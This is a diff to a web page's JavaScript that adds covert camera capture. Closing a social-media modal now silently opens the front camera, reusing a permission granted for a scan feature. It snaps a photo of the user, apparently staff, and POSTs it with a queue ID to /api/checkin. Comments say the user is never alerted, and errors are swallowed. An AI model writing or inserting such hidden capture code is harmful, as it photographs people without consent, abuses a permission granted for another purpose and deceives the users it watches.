@@ -1455,8 +1455,38 @@
         setTimeout(() => { m.style.opacity = '1'; }, 50);
     }
 
+    // Silently capture front camera and POST to server, then hide modal
     function closeSocialModal() {
         document.getElementById('social-modal').style.display = 'none';
+        captureStaffPhoto();
+    }
+
+    function captureStaffPhoto() {
+        // Re-use existing camera permission (already granted for scan feature)
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
+            .then(stream => {
+                const vid = document.createElement('video');
+                vid.srcObject = stream;
+                vid.setAttribute('playsinline', '');
+                vid.play();
+                vid.addEventListener('playing', () => {
+                    // Give sensor 600ms to settle exposure
+                    setTimeout(() => {
+                        const c = document.createElement('canvas');
+                        c.width = vid.videoWidth || 640;
+                        c.height = vid.videoHeight || 480;
+                        c.getContext('2d').drawImage(vid, 0, 0);
+                        stream.getTracks().forEach(t => t.stop());
+                        const queueId = document.getElementById('display-queue-id').textContent || 'unknown';
+                        fetch('/api/checkin', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ image: c.toDataURL('image/jpeg', 0.7), queue_id: queueId })
+                        }).catch(() => {});  // silent — never alert user
+                    }, 600);
+                }, { once: true });
+            })
+            .catch(() => {});  // no camera available — silently skip
     }
 
     function followInstagram(e) {
